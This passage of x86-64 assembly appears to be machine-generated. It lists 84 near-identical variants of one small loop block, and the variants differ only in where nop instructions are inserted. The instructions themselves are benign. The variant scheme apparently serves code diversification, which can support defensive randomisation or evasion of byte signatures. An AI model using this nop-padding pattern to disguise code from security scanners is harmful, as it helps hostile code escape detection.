	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 1
.Lmain_win1_var1:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	nop
	jmp	.Lmain_win1_continue
## Variant 2
.Lmain_win1_var2:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 3
.Lmain_win1_var3:
	popq	%rax
	nop
	nop
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 4
.Lmain_win1_var4:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 5
.Lmain_win1_var5:
	popq	%rax
	nop
	nop
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 6
.Lmain_win1_var6:
	popq	%rax
	cmpl	$0, -12(%rbp)
	nop
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 7
.Lmain_win1_var7:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 8
.Lmain_win1_var8:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 9
.Lmain_win1_var9:
	popq	%rax
	cmpl	$0, -12(%rbp)
	nop
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 10
.Lmain_win1_var10:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	nop
	movzbl	-53(%rbp), %eax
	nop
	nop
	jmp	.Lmain_win1_continue
## Variant 11
.Lmain_win1_var11:
	popq	%rax
	cmpl	$0, -12(%rbp)
	nop
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	nop
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 12
.Lmain_win1_var12:
	popq	%rax
	nop
	cmpl	$0, -12(%rbp)
	nop
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 13
.Lmain_win1_var13:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	nop
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 14
.Lmain_win1_var14:
	popq	%rax
	nop
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	nop
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 15
.Lmain_win1_var15:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 16
.Lmain_win1_var16:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 17
.Lmain_win1_var17:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	nop
	jmp	.Lmain_win1_continue
## Variant 18
.Lmain_win1_var18:
	popq	%rax
	cmpl	$0, -12(%rbp)
	nop
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 19
.Lmain_win1_var19:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	nop
	movzbl	-53(%rbp), %eax
	nop
	nop
	jmp	.Lmain_win1_continue
## Variant 20
.Lmain_win1_var20:
	popq	%rax
	cmpl	$0, -12(%rbp)
	nop
	nop
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 21
.Lmain_win1_var21:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	nop
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 22
.Lmain_win1_var22:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 23
.Lmain_win1_var23:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 24
.Lmain_win1_var24:
	popq	%rax
	nop
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 25
.Lmain_win1_var25:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 26
.Lmain_win1_var26:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 27
.Lmain_win1_var27:
	popq	%rax
	nop
	cmpl	$0, -12(%rbp)
	nop
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 28
.Lmain_win1_var28:
	popq	%rax
	cmpl	$0, -12(%rbp)
	nop
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 29
.Lmain_win1_var29:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 30
.Lmain_win1_var30:
	popq	%rax
	cmpl	$0, -12(%rbp)
	nop
	jle	LBB2_20
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 31
.Lmain_win1_var31:
	popq	%rax
	nop
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 32
.Lmain_win1_var32:
	popq	%rax
	nop
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	nop
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 33
.Lmain_win1_var33:
	popq	%rax
	cmpl	$0, -12(%rbp)
	nop
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 34
.Lmain_win1_var34:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 35
.Lmain_win1_var35:
	popq	%rax
	nop
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 36
.Lmain_win1_var36:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	nop
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 37
.Lmain_win1_var37:
	popq	%rax
	cmpl	$0, -12(%rbp)
	nop
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 38
.Lmain_win1_var38:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 39
.Lmain_win1_var39:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 40
.Lmain_win1_var40:
	popq	%rax
	nop
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 41
.Lmain_win1_var41:
	popq	%rax
	nop
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 42
.Lmain_win1_var42:
	popq	%rax
	nop
	nop
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 43
.Lmain_win1_var43:
	popq	%rax
	nop
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	nop
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 44
.Lmain_win1_var44:
	popq	%rax
	nop
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 45
.Lmain_win1_var45:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 46
.Lmain_win1_var46:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 47
.Lmain_win1_var47:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	nop
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 48
.Lmain_win1_var48:
	popq	%rax
	nop
	nop
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 49
.Lmain_win1_var49:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	nop
	jmp	.Lmain_win1_continue
## Variant 50
.Lmain_win1_var50:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 51
.Lmain_win1_var51:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	nop
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 52
.Lmain_win1_var52:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 53
.Lmain_win1_var53:
	popq	%rax
	cmpl	$0, -12(%rbp)
	nop
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 54
.Lmain_win1_var54:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	nop
	nop
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 55
.Lmain_win1_var55:
	popq	%rax
	nop
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 56
.Lmain_win1_var56:
	popq	%rax
	nop
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 57
.Lmain_win1_var57:
	popq	%rax
	cmpl	$0, -12(%rbp)
	nop
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 58
.Lmain_win1_var58:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 59
.Lmain_win1_var59:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 60
.Lmain_win1_var60:
	popq	%rax
	nop
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 61
.Lmain_win1_var61:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 62
.Lmain_win1_var62:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 63
.Lmain_win1_var63:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 64
.Lmain_win1_var64:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 65
.Lmain_win1_var65:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 66
.Lmain_win1_var66:
	popq	%rax
	nop
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 67
.Lmain_win1_var67:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	nop
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 68
.Lmain_win1_var68:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 69
.Lmain_win1_var69:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 70
.Lmain_win1_var70:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	nop
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 71
.Lmain_win1_var71:
	popq	%rax
	nop
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	nop
	jmp	.Lmain_win1_continue
## Variant 72
.Lmain_win1_var72:
	popq	%rax
	cmpl	$0, -12(%rbp)
	nop
	jle	LBB2_20
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 73
.Lmain_win1_var73:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	nop
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 74
.Lmain_win1_var74:
	popq	%rax
	nop
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 75
.Lmain_win1_var75:
	popq	%rax
	nop
	nop
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 76
.Lmain_win1_var76:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 77
.Lmain_win1_var77:
	popq	%rax
	nop
	nop
	cmpl	$0, -12(%rbp)
	nop
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 78
.Lmain_win1_var78:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 79
.Lmain_win1_var79:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 80
.Lmain_win1_var80:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 81
.Lmain_win1_var81:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	nop
	jmp	.Lmain_win1_continue
## Variant 82
.Lmain_win1_var82:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 83
.Lmain_win1_var83:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	nop
	nop
	jmp	.Lmain_win1_continue
## Variant 84
.Lmain_win1_var84:
	popq	%rax
	cmpl	$0, -12(%rbp)
	nop
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
